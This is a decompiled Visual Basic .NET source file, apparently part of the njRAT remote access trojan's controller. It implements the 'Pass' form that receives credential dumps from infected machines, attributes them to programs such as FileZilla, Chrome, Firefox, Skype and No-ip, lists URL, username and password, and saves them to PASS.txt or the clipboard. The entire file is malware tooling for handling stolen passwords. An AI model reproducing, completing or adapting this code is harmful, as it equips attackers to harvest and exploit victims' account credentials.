Imports System
Imports System.Collections
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices

Namespace NJRAT
	' Token: 0x0200001B RID: 27
	<DesignerGenerated()>
	Public Partial Class Pass
		Inherits Form

		' Token: 0x0600036E RID: 878 RVA: 0x0001E0B0 File Offset: 0x0001C2B0
		<DebuggerNonUserCode()>
		Private Shared Sub __ENCAddToList(value As Object)
			Dim _ENCList As List(Of WeakReference) = Pass.__ENCList
			SyncLock _ENCList
				If Pass.__ENCList.Count = Pass.__ENCList.Capacity Then
					Dim num As Integer = 0
					Dim num2 As Integer = 0
					Dim num3 As Integer = Pass.__ENCList.Count - 1
					Dim num4 As Integer = num2
					While True
						Dim num5 As Integer = num4
						Dim num6 As Integer = num3
						If num5 > num6 Then
							Exit For
						End If
						Dim weakReference As WeakReference = Pass.__ENCList(num4)
						If weakReference.IsAlive Then
							If num4 <> num Then
								Pass.__ENCList(num) = Pass.__ENCList(num4)
							End If
							num += 1
						End If
						num4 += 1
					End While
					Pass.__ENCList.RemoveRange(num, Pass.__ENCList.Count - num)
					Pass.__ENCList.Capacity = Pass.__ENCList.Count
				End If
				Pass.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
			End SyncLock
		End Sub

		' Token: 0x17000137 RID: 311
		' (get) Token: 0x06000371 RID: 881 RVA: 0x0001EB98 File Offset: 0x0001CD98
		' (set) Token: 0x06000372 RID: 882 RVA: 0x000030A2 File Offset: 0x000012A2
		Friend Overridable Property ContextMenuStrip1 As ContextMenuStrip
			<DebuggerNonUserCode()>
			Get
				Return Me._ContextMenuStrip1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ContextMenuStrip)
				Me._ContextMenuStrip1 = value
			End Set
		End Property

		' Token: 0x17000138 RID: 312
		' (get) Token: 0x06000373 RID: 883 RVA: 0x0001EBB0 File Offset: 0x0001CDB0
		' (set) Token: 0x06000374 RID: 884 RVA: 0x0001EBC8 File Offset: 0x0001CDC8
		Friend Overridable Property CopyUseToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._CopyUseToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CopyUseToolStripMenuItem_Click
				If Me._CopyUseToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._CopyUseToolStripMenuItem.Click, value2
				End If
				Me._CopyUseToolStripMenuItem = value
				If Me._CopyUseToolStripMenuItem IsNot Nothing Then
					AddHandler Me._CopyUseToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000139 RID: 313
		' (get) Token: 0x06000375 RID: 885 RVA: 0x0001EC20 File Offset: 0x0001CE20
		' (set) Token: 0x06000376 RID: 886 RVA: 0x0001EC38 File Offset: 0x0001CE38
		Friend Overridable Property CopyPassToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._CopyPassToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CopyPassToolStripMenuItem_Click
				If Me._CopyPassToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._CopyPassToolStripMenuItem.Click, value2
				End If
				Me._CopyPassToolStripMenuItem = value
				If Me._CopyPassToolStripMenuItem IsNot Nothing Then
					AddHandler Me._CopyPassToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700013A RID: 314
		' (get) Token: 0x06000377 RID: 887 RVA: 0x0001EC90 File Offset: 0x0001CE90
		' (set) Token: 0x06000378 RID: 888 RVA: 0x0001ECA8 File Offset: 0x0001CEA8
		Friend Overridable Property CopySiteToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._CopySiteToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CopySiteToolStripMenuItem_Click
				If Me._CopySiteToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._CopySiteToolStripMenuItem.Click, value2
				End If
				Me._CopySiteToolStripMenuItem = value
				If Me._CopySiteToolStripMenuItem IsNot Nothing Then
					AddHandler Me._CopySiteToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700013B RID: 315
		' (get) Token: 0x06000379 RID: 889 RVA: 0x0001ED00 File Offset: 0x0001CF00
		' (set) Token: 0x0600037A RID: 890 RVA: 0x0001ED18 File Offset: 0x0001CF18
		Friend Overridable Property CopyALLToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._CopyALLToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CopyALLToolStripMenuItem_Click
				If Me._CopyALLToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._CopyALLToolStripMenuItem.Click, value2
				End If
				Me._CopyALLToolStripMenuItem = value
				If Me._CopyALLToolStripMenuItem IsNot Nothing Then
					AddHandler Me._CopyALLToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700013C RID: 316
		' (get) Token: 0x0600037B RID: 891 RVA: 0x0001ED70 File Offset: 0x0001CF70
		' (set) Token: 0x0600037C RID: 892 RVA: 0x000030AB File Offset: 0x000012AB
		Friend Overridable Property SaveAllToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._SaveAllToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Me._SaveAllToolStripMenuItem = value
			End Set
		End Property

		' Token: 0x1700013D RID: 317
		' (get) Token: 0x0600037D RID: 893 RVA: 0x0001ED88 File Offset: 0x0001CF88
		' (set) Token: 0x0600037E RID: 894 RVA: 0x0001EDA0 File Offset: 0x0001CFA0
		Friend Overridable Property InClipboardToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._InClipboardToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.InClipboardToolStripMenuItem_Click
				If Me._InClipboardToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._InClipboardToolStripMenuItem.Click, value2
				End If
				Me._InClipboardToolStripMenuItem = value
				If Me._InClipboardToolStripMenuItem IsNot Nothing Then
					AddHandler Me._InClipboardToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700013E RID: 318
		' (get) Token: 0x0600037F RID: 895 RVA: 0x0001EDF8 File Offset: 0x0001CFF8
		' (set) Token: 0x06000380 RID: 896 RVA: 0x0001EE10 File Offset: 0x0001D010
		Friend Overridable Property InDiskToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._InDiskToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.InDiskToolStripMenuItem_Click
				If Me._InDiskToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._InDiskToolStripMenuItem.Click, value2
				End If
				Me._InDiskToolStripMenuItem = value
				If Me._InDiskToolStripMenuItem IsNot Nothing Then
					AddHandler Me._InDiskToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700013F RID: 319
		' (get) Token: 0x06000381 RID: 897 RVA: 0x0001EE68 File Offset: 0x0001D068
		' (set) Token: 0x06000382 RID: 898 RVA: 0x0001EE80 File Offset: 0x0001D080
		Friend Overridable Property FindToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._FindToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.FindToolStripMenuItem_Click
				If Me._FindToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._FindToolStripMenuItem.Click, value2
				End If
				Me._FindToolStripMenuItem = value
				If Me._FindToolStripMenuItem IsNot Nothing Then
					AddHandler Me._FindToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000140 RID: 320
		' (get) Token: 0x06000383 RID: 899 RVA: 0x0001EED8 File Offset: 0x0001D0D8
		' (set) Token: 0x06000384 RID: 900 RVA: 0x0001EEF0 File Offset: 0x0001D0F0
		Friend Overridable Property RemoveEmptyPWToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._RemoveEmptyPWToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RemoveEmptyPWToolStripMenuItem_Click
				If Me._RemoveEmptyPWToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._RemoveEmptyPWToolStripMenuItem.Click, value2
				End If
				Me._RemoveEmptyPWToolStripMenuItem = value
				If Me._RemoveEmptyPWToolStripMenuItem IsNot Nothing Then
					AddHandler Me._RemoveEmptyPWToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000141 RID: 321
		' (get) Token: 0x06000385 RID: 901 RVA: 0x0001EF48 File Offset: 0x0001D148
		' (set) Token: 0x06000386 RID: 902 RVA: 0x000030B4 File Offset: 0x000012B4
		Friend Overridable Property SaveFileDialog1 As SaveFileDialog
			<DebuggerNonUserCode()>
			Get
				Return Me._SaveFileDialog1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As SaveFileDialog)
				Me._SaveFileDialog1 = value
			End Set
		End Property

		' Token: 0x17000142 RID: 322
		' (get) Token: 0x06000387 RID: 903 RVA: 0x0001EF60 File Offset: 0x0001D160
		' (set) Token: 0x06000388 RID: 904 RVA: 0x000030BD File Offset: 0x000012BD
		Friend Overridable Property ImageList1 As ImageList
			<DebuggerNonUserCode()>
			Get
				Return Me._ImageList1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ImageList)
				Me._ImageList1 = value
			End Set
		End Property

		' Token: 0x17000143 RID: 323
		' (get) Token: 0x06000389 RID: 905 RVA: 0x0001EF78 File Offset: 0x0001D178
		' (set) Token: 0x0600038A RID: 906 RVA: 0x000030C6 File Offset: 0x000012C6
		Friend Overridable Property MenuStrip1 As MenuStrip
			<DebuggerNonUserCode()>
			Get
				Return Me._MenuStrip1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As MenuStrip)
				Me._MenuStrip1 = value
			End Set
		End Property

		' Token: 0x17000144 RID: 324
		' (get) Token: 0x0600038B RID: 907 RVA: 0x0001EF90 File Offset: 0x0001D190
		' (set) Token: 0x0600038C RID: 908 RVA: 0x0001EFA8 File Offset: 0x0001D1A8
		Friend Overridable Property ToolStripMenuItem1 As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._ToolStripMenuItem1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ToolStripMenuItem1_Click
				If Me._ToolStripMenuItem1 IsNot Nothing Then
					RemoveHandler Me._ToolStripMenuItem1.Click, value2
				End If
				Me._ToolStripMenuItem1 = value
				If Me._ToolStripMenuItem1 IsNot Nothing Then
					AddHandler Me._ToolStripMenuItem1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000145 RID: 325
		' (get) Token: 0x0600038D RID: 909 RVA: 0x0001F000 File Offset: 0x0001D200
		' (set) Token: 0x0600038E RID: 910 RVA: 0x0001F018 File Offset: 0x0001D218
		Friend Overridable Property L1 As GClass9
			<DebuggerNonUserCode()>
			Get
				Return Me._L1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GClass9)
				Dim value2 As EventHandler = AddressOf Me.L1_DoubleClick
				If Me._L1 IsNot Nothing Then
					RemoveHandler Me._L1.DoubleClick, value2
				End If
				Me._L1 = value
				If Me._L1 IsNot Nothing Then
					AddHandler Me._L1.DoubleClick, value2
				End If
			End Set
		End Property

		' Token: 0x17000146 RID: 326
		' (get) Token: 0x0600038F RID: 911 RVA: 0x0001F070 File Offset: 0x0001D270
		' (set) Token: 0x06000390 RID: 912 RVA: 0x000030CF File Offset: 0x000012CF
		Friend Overridable Property ColumnHeader1 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader1 = value
			End Set
		End Property

		' Token: 0x17000147 RID: 327
		' (get) Token: 0x06000391 RID: 913 RVA: 0x0001F088 File Offset: 0x0001D288
		' (set) Token: 0x06000392 RID: 914 RVA: 0x000030D8 File Offset: 0x000012D8
		Friend Overridable Property ColumnHeader2 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader2 = value
			End Set
		End Property

		' Token: 0x17000148 RID: 328
		' (get) Token: 0x06000393 RID: 915 RVA: 0x0001F0A0 File Offset: 0x0001D2A0
		' (set) Token: 0x06000394 RID: 916 RVA: 0x000030E1 File Offset: 0x000012E1
		Friend Overridable Property ColumnHeader3 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader3 = value
			End Set
		End Property

		' Token: 0x17000149 RID: 329
		' (get) Token: 0x06000395 RID: 917 RVA: 0x0001F0B8 File Offset: 0x0001D2B8
		' (set) Token: 0x06000396 RID: 918 RVA: 0x000030EA File Offset: 0x000012EA
		Friend Overridable Property ColumnHeader4 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader4
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader4 = value
			End Set
		End Property

		' Token: 0x1700014A RID: 330
		' (get) Token: 0x06000397 RID: 919 RVA: 0x0001F0D0 File Offset: 0x0001D2D0
		' (set) Token: 0x06000398 RID: 920 RVA: 0x000030F3 File Offset: 0x000012F3
		Friend Overridable Property ColumnHeader5 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader5
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader5 = value
			End Set
		End Property

		' Token: 0x06000399 RID: 921 RVA: 0x000030FC File Offset: 0x000012FC
		Public Sub New()
			Pass.__ENCAddToList(Me)
			Me.bool_0 = True
			Me.InitializeComponent()
		End Sub

		' Token: 0x0600039A RID: 922 RVA: 0x0001F0E8 File Offset: 0x0001D2E8
		Public Sub FxCOLM(L1 As ListView)
			Dim num As Integer = L1.Columns.Count - 1
			For i As Integer = 0 To num
				L1.Columns(i).AutoResize(ColumnHeaderAutoResizeStyle.HeaderSize)
			Next
		End Sub

		' Token: 0x0600039B RID: 923 RVA: 0x0001F128 File Offset: 0x0001D328
		Private Sub InClipboardToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				Dim text As String = Me.SV()
				If text.Length > 0 Then
					Clipboard.SetText(text)
					Interaction.MsgBox("Saved in Clipboard", MsgBoxStyle.OkOnly, Nothing)
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0600039C RID: 924 RVA: 0x0001F17C File Offset: 0x0001D37C
		Private Sub InDiskToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				If Me.SaveFileDialog1.ShowDialog() = DialogResult.OK Then
					File.WriteAllText(Me.SaveFileDialog1.FileName, Me.SV())
					Interaction.MsgBox(Me.SaveFileDialog1.FileName, MsgBoxStyle.OkOnly, Nothing)
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0600039D RID: 925 RVA: 0x0001F1E4 File Offset: 0x0001D3E4
		Private Sub FindToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				Dim text As String = Interaction.InputBox("Search", String.Empty, String.Empty, -1, -1)
				If Operators.CompareString(text, String.Empty, False) <> 0 Then
					Dim pass As Pass = New Pass() With { .Name = "e", .Text = "Search For '" + text + "'" }
					pass.Show()
					Try
						For Each obj As Object In Me.L1.Items
							Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
							Dim num As Integer = 0
							Do
								If Strings.InStr(listViewItem.SubItems(num).Text.ToLower(), text.ToLower(), CompareMethod.Binary) > 0 Then
									Dim listViewItem2 As ListViewItem = pass.L1.Items.Add(listViewItem.Text, listViewItem.ImageIndex)
									Dim num2 As Integer = listViewItem.SubItems.Count - 1
									For i As Integer = 1 To num2
										listViewItem2.SubItems.Add(listViewItem.SubItems(i).Text)
									Next
								Else
									num += 1
								End If
							Loop While num <= 2
						Next
					Finally
						Dim enumerator As IEnumerator
						If TypeOf enumerator Is IDisposable Then
							TryCast(enumerator, IDisposable).Dispose()
						End If
					End Try
					pass.ToolStripMenuItem1.Text = "Passwords(X)".Replace("X", Conversions.ToString(pass.L1.Items.Count))
					Me.FxCOLM(pass.L1)
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0600039E RID: 926 RVA: 0x0001F3C8 File Offset: 0x0001D5C8
		Private Sub CopyUseToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				If Me.L1.SelectedItems(0).Text.Length > 0 Then
					Clipboard.SetText(Me.L1.SelectedItems(0).Text)
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0600039F RID: 927 RVA: 0x0001F434 File Offset: 0x0001D634
		Private Sub CopyPassToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				If Me.L1.SelectedItems(0).SubItems(1).Text.Length > 0 Then
					Clipboard.SetText(Me.L1.SelectedItems(0).SubItems(1).Text)
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060003A0 RID: 928 RVA: 0x0001F4B4 File Offset: 0x0001D6B4
		Private Sub CopyALLToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				Dim text As String = String.Empty
				Try
					For Each obj As Object In Me.L1.SelectedItems
						Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
						text = String.Concat(New String() { text, "URL: ", listViewItem.SubItems(2).Text, vbCrLf & "USR: ", listViewItem.SubItems(0).Text, vbCrLf & "PWD: ", listViewItem.SubItems(1).Text, vbCrLf & vbCrLf })
					Next
				Finally
					Dim enumerator As IEnumerator
					If TypeOf enumerator Is IDisposable Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
				If text.Length > 0 Then
					Clipboard.SetText(text)
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060003A1 RID: 929 RVA: 0x0001F5B8 File Offset: 0x0001D7B8
		Private Sub RemoveEmptyPWToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				For Each obj As Object In Me.L1.Items
					Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
					If Operators.CompareString(listViewItem.SubItems(1).Text, String.Empty, False) = 0 Then
						listViewItem.Remove()
					End If
				Next
			Finally
				Dim enumerator As IEnumerator
				If TypeOf enumerator Is IDisposable Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
			Me.ToolStripMenuItem1.Text = "Passwords(X)".Replace("X", Conversions.ToString(Me.L1.Items.Count))
		End Sub

		' Token: 0x060003A2 RID: 930 RVA: 0x0001F66C File Offset: 0x0001D86C
		Public Function SV() As String
			Dim text As String = String.Empty
			Try
				For Each obj As Object In Me.L1.Items
					Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
					text = String.Concat(New String() { text, "URL: ", listViewItem.SubItems(2).Text, vbCrLf & "USR: ", listViewItem.Text, vbCrLf & "PWD: ", listViewItem.SubItems(1).Text, vbCrLf & vbCrLf })
				Next
			Finally
				Dim enumerator As IEnumerator
				If TypeOf enumerator Is IDisposable Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
			Return text
		End Function

		' Token: 0x060003A3 RID: 931 RVA: 0x0001F738 File Offset: 0x0001D938
		Public Sub XD(ByRef c As Client, ByRef S As String)
			Dim array As String() = Strings.Split(S, " ", -1, CompareMethod.Binary)
			Dim num As Integer = -1
			If Not Directory.Exists(c.Folder) Then
				Directory.CreateDirectory(c.Folder)
			End If
			Dim array2 As String() = New String() { "FileZilla", "No-ip", "DynDns", "Paltalk", "FireFox", "Chrome", "MSN", "Yahoo", "Opera", "Internet Explorer", "ooVoo", "DUC v3", "Skype" }
			Dim text As String = String.Empty
			For Each text2 As String In array
				Try
					If text2.Length > 0 Then
						If Operators.CompareString(text2, "*", False) = 0 Then
							num += 1
						Else
							If Not text2.Contains(":") Then
								text2 = Class6.smethod_16(text2)
							End If
							Dim array4 As String() = Strings.Split(text2, ":", -1, CompareMethod.Binary)
							If array4.Length > 3 Then
								Dim expression As String = text2
								Dim find As String = array4(0) + ":" + array4(1)
								Dim text3 As String = array4(0) + ":" + array4(1)
								array4 = Strings.Split(Strings.Replace(expression, find, Class6.smethod_14(text3), 1, -1, CompareMethod.Binary), ":", -1, CompareMethod.Binary)
							End If
							Dim listViewItem As ListViewItem = New ListViewItem()
							listViewItem = Me.L1.Items.Add(Class6.smethod_16(array4(1)), num)
							listViewItem.SubItems.Add(Class6.smethod_16(array4(2)))
							listViewItem.SubItems.Add(Class6.smethod_16(array4(0)))
							listViewItem.SubItems.Add(array2(num))
							NewLateBinding.LateCall(listViewItem.SubItems, Nothing, "Add", New Object() { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Class7.smethod_1(c.L)))) }, Nothing, Nothing, Nothing, True)
							text = text + "USR: " + listViewItem.Text + vbCrLf
							text = text + "PWD: " + listViewItem.SubItems(1).Text + vbCrLf
							text = text + "URL: " + listViewItem.SubItems(2).Text + vbCrLf & vbCrLf
						End If
					End If
				Catch ex As Exception
				End Try
			Next
			Try
				File.WriteAllText(c.Folder + "PASS.txt", text)
			Catch ex2 As Exception
			End Try
			Me.FxCOLM(Me.L1)
			Me.ToolStripMenuItem1.Text = "Passwords(X)".Replace("X", Conversions.ToString(Me.L1.Items.Count))
		End Sub

		' Token: 0x060003A4 RID: 932 RVA: 0x0001FA64 File Offset: 0x0001DC64
		Private Sub L1_DoubleClick(sender As Object, e As EventArgs)
			Try
				Dim text As String = Me.L1.SelectedItems(0).SubItems(2).Text
				If Not text.Contains("://") Then
					text = "http://" + text
				End If
				Process.Start(text)
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060003A5 RID: 933 RVA: 0x00003117 File Offset: 0x00001317
		Private Sub ToolStripMenuItem1_Click(sender As Object, e As EventArgs)
			Me.bool_0 = True
			Me.L1.BringToFront()
		End Sub

		' Token: 0x060003A6 RID: 934 RVA: 0x0001FAD8 File Offset: 0x0001DCD8
		Private Sub CopySiteToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				If Me.L1.SelectedItems(0).SubItems(2).Text.Length > 0 Then
					Clipboard.SetText(Me.L1.SelectedItems(0).SubItems(2).Text)
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x040001A0 RID: 416
		Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)()

		' Token: 0x040001A2 RID: 418
		<AccessedThroughProperty("ContextMenuStrip1")>
		Private _ContextMenuStrip1 As ContextMenuStrip

		' Token: 0x040001A3 RID: 419
		<AccessedThroughProperty("CopyUseToolStripMenuItem")>
		Private _CopyUseToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040001A4 RID: 420
		<AccessedThroughProperty("CopyPassToolStripMenuItem")>
		Private _CopyPassToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040001A5 RID: 421
		<AccessedThroughProperty("CopySiteToolStripMenuItem")>
		Private _CopySiteToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040001A6 RID: 422
		<AccessedThroughProperty("CopyALLToolStripMenuItem")>
		Private _CopyALLToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040001A7 RID: 423
		<AccessedThroughProperty("SaveAllToolStripMenuItem")>
		Private _SaveAllToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040001A8 RID: 424
		<AccessedThroughProperty("InClipboardToolStripMenuItem")>
		Private _InClipboardToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040001A9 RID: 425
		<AccessedThroughProperty("InDiskToolStripMenuItem")>
		Private _InDiskToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040001AA RID: 426
		<AccessedThroughProperty("FindToolStripMenuItem")>
		Private _FindToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040001AB RID: 427
		<AccessedThroughProperty("RemoveEmptyPWToolStripMenuItem")>
		Private _RemoveEmptyPWToolStripMenuItem As ToolStripMenuItem

		' Token: 0x040001AC RID: 428
		<AccessedThroughProperty("SaveFileDialog1")>
		Private _SaveFileDialog1 As SaveFileDialog

		' Token: 0x040001AD RID: 429
		<AccessedThroughProperty("ImageList1")>
		Private _ImageList1 As ImageList

		' Token: 0x040001AE RID: 430
		<AccessedThroughProperty("MenuStrip1")>
		Private _MenuStrip1 As MenuStrip

		' Token: 0x040001AF RID: 431
		<AccessedThroughProperty("ToolStripMenuItem1")>
		Private _ToolStripMenuItem1 As ToolStripMenuItem

		' Token: 0x040001B0 RID: 432
		<AccessedThroughProperty("L1")>
		Private _L1 As GClass9

		' Token: 0x040001B1 RID: 433
		<AccessedThroughProperty("ColumnHeader1")>
		Private _ColumnHeader1 As ColumnHeader

		' Token: 0x040001B2 RID: 434
		<AccessedThroughProperty("ColumnHeader2")>
		Private _ColumnHeader2 As ColumnHeader

		' Token: 0x040001B3 RID: 435
		<AccessedThroughProperty("ColumnHeader3")>
		Private _ColumnHeader3 As ColumnHeader

		' Token: 0x040001B4 RID: 436
		<AccessedThroughProperty("ColumnHeader4")>
		Private _ColumnHeader4 As ColumnHeader

		' Token: 0x040001B5 RID: 437
		<AccessedThroughProperty("ColumnHeader5")>
		Private _ColumnHeader5 As ColumnHeader

		' Token: 0x040001B6 RID: 438
		Private bool_0 As Boolean
	End Class
End Namespace
